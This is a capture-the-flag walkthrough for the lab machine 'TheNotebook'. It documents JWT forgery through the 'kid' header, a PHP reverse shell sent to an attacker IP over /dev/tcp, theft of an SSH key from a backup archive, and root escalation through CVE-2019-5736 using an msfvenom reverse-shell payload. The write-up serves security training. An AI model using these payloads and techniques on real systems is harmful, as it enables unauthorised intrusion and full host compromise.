@@ -1,0 +1,179 @@
+TheNotebook
+
+ 27th Jul 2021 / Document No D21.100.124
+ Prepared By: polarbearer
+ Machine Author(s): mostwanted002
+ Difficulty: Medium
+ Classification: Official
+Synopsis
+
+TheNotebook is a medium difficulty Linux machine that showcases an insecure JWT implementation, which
+allows unprivileged users to obtain administrative access by forging and signing tokens with arbitrary
+attributes. This is possible because the private key used for signing tokens is fetched from an external
+source, which can be easily modified to point to an attacker-controlled location. Once access to the
+administration panel is obtained, it is possible to upload and execute PHP files resulting in remote
+command execution. A private SSH key can then be obtained from a world-readable backup archive,
+allowing lateral movement to a user that has the privileges to run Docker commands via sudo . The Docker
+version installed to the system is vulnerable to CVE-2019-5736, which allows to escalate privileges on the
+host system.
+
+Skills Required
+
+      Managing HTTP cookies
+      Basic PHP knowledge
+      Linux system enumeration
+      Basic knowledge of Docker commands
+
+Skills Learned
+
+      Abusing the Key ID parameter in JSON Web Tokens
+      Exploiting CVE-2019-573 to escalalate privileges via Docker
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.230 | grep ^[0-9] | cut -d '/' -f1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.230
+
+Nmap reveals that OpenSSH and nginx are listening on their default ports.
+
+Nginx
+
+Browsing to port 80, the main page of a web application called The Notebook is returned.
+
+Clicking the Register link on the navigation bar takes us to the /register page, where we can create a
+new account.
+Upon account creation we are automatically logged in.
+Clicking the Notes link on the navbar takes us to our personal notes page.
+Foothold
+
+The auth cookie contains a JWT token.
+
+We can either manually decode the base64-encoded header and payload fields or let JTW.IO do it for us.
+
+The header data shows that the RS256 algorithm is used for signing. Additionally, a kid (Key ID) is defined;
+this parameter, according to RFC 7515, is used as a hint indicating the private key that was used to sign the
+token. By making the Key ID point to a location under our control, it may be possible to forge valid tokens
+containing arbitrary data.
+Looking at the payload, the most interesting field seems to be admin_cap , which is currently set to false
+for our user. Setting it to true might grant us administrative privileges.
+The attack plan is as follows:
+
+      generate a private key and host it on a local web server;
+      forge a token with the admin_cap field set to true and the kid URL pointing to our web server;
+      sign the token with our private key;
+      set the forged JWT as our auth cookie.
+The following Python script (using the PyJWT module) will handle all the above steps:
+   #!/usr/bin/env python3
+   import jwt
+   from Crypto.PublicKey import RSA
+   from http.server import SimpleHTTPRequestHandler
+   import socketserver
+   key = RSA.generate(2048)
+   privkey = key.exportKey('PEM')
+   class MyHttpRequestHandler(SimpleHTTPRequestHandler):
+
+          def do_GET(self):
+                 self.send_response(200)
+                 self.send_header("Content-type", "text/html")
+                 self.end_headers()
+                 self.wfile.write(privkey)
+
+   if __name__ == "__main__":
+          token = jwt.encode(
+                 {"username": "newuser", "email": "new@new.htb", "admin_cap": 1},
+                 privkey,
+                 algorithm="RS256",
+                 headers={"kid": "http://10.10.14.2:8000/private.key"})
+          print(token.decode())
+          handler_object = MyHttpRequestHandler
+          my_server = socketserver.TCPServer(("", 8000), handler_object)
+          my_server.serve_forever()
+
+We run the script and set the generated token as our auth cookie in the Web console:
+
+As soon as we reload the page, a request for /private.key is sent to our web server:
+Looking back at the web browser, we see that we have now gained adminisration privileges and we can now
+access the Admin Panel.
+
+The View Notes button takes us to the /admin/viewnotes page, where notes of all users can be viewed:
+
+The Need to fix config and Backups are scheduled notes, written by the admin user, provide us with
+interesting information about the system and the web application:
+We move to the Upload File page ( /admin/upload ) from the Admin Panel. According to the Need to
+fix config note, if we managed to upload a PHP file we could gain arbitrary code execution on the target.
+We create the following 1.php file and upload it through the web interface:
+
+   <?php passthru("/bin/bash -c 'bash -i &>/dev/tcp/10.10.14.2/7777 0>&1'") ?>
+
+The file is renamed to a random hexadecimal string.
+
+We open a Netcat listener on port 7777 and request the uploaded file:
+   nc -lnvp 7777
+   curl http://10.10.10.230/b47722651cef9bfc0e7f0081b1e79903.php
+
+A reverse shell in the context of the www-data user is sent back to our listener:
+We upgrade our shell to an interactive pty:
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+Lateral Movement
+
+We start enumerating the system, remembering the admin note about system backups. The /var/backups
+directory contains a world readable home.tar.gz file:
+
+We extract the file to a temporary directory:
+   mkdir /tmp/.tempdir && tar -C /tmp/.tempdir -xzf /var/backups/home.tar.gz
+
+Running find on the extracted directory reveals the existence of an SSH private key:
+
+We copy the key to our attacking machine, chmod it to 600 and use it to SSH to the system as the noah
+user:
+
+   chmod 600 id_rsa
+   ssh -i id_rsa noah@10.10.10.230
+The user flag can be found in /home/noah/user.txt .
+Privilege Escalation
+
+We start by enumerating sudo privileges:
+
+The user is allowed to run /usr/bin/docker exec -it web app-dev01* as root .
+We check the Docker version:
+
+This version appears to be vulnerable to CVE-2019-5736. This would allow us to use one of the publicly
+available PoCs to overwrite RunC and gain root privileges on the host system.
+We clone the GitHub repository and switch to the project directory:
+
+   git clone https://github.com/twistlock/RunC-CVE-2019-5736
+   cd RunC-CVE-2019-5736
+We replace the binary provided with the PoC with a malicious executable generated with msfvenom :
+   cd exec_POC/
+   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=7777 -f elf -o new_runc
+We run a Netcat listener on port 7777 and a Python http.server on port 8000:
+   nc -lnvp 7777
+   python -m http.server
+
+On the target machine, we run sudo docker to obtain an interactive shell on the webapp-dev01 container:
+   sudo docker exec -it webapp-dev01 /bin/bash
+
+We open a second SSH session on the system:
+   ssh -i id_rsa noah@10.10.10.230
+
+From our shell inside the Docker container, we download the PoC files from our running http.server :
+   cd /; for f in bash_evil new_runc overwrite_runc replace.sh; do wget
+   http://10.10.14.2:8000/$f; done
+
+We set required permissions, create a backup copy of /bin/bash and overwrite it with our bash_evil :
+   chmod +x replace.sh overwrite_runc bash_evil
+   mv /bin/bash /bin/bash_original
+   mv /bash_evil /bin/bash
+
+Next, we run the replace.sh script to overwrite RunC:
+   /bin/bash_original /replace.sh
+From our second shell as noah we send another command to the container to trigger the malicious
+payload:
+
+   noah@thenotebook:~$ sudo docker exec -it webapp-dev01 /bin/bash_original
+A reverse shell with root privileges is sent to our Netcat listener:
+
+The root flag can be found in /root/root.txt .
+
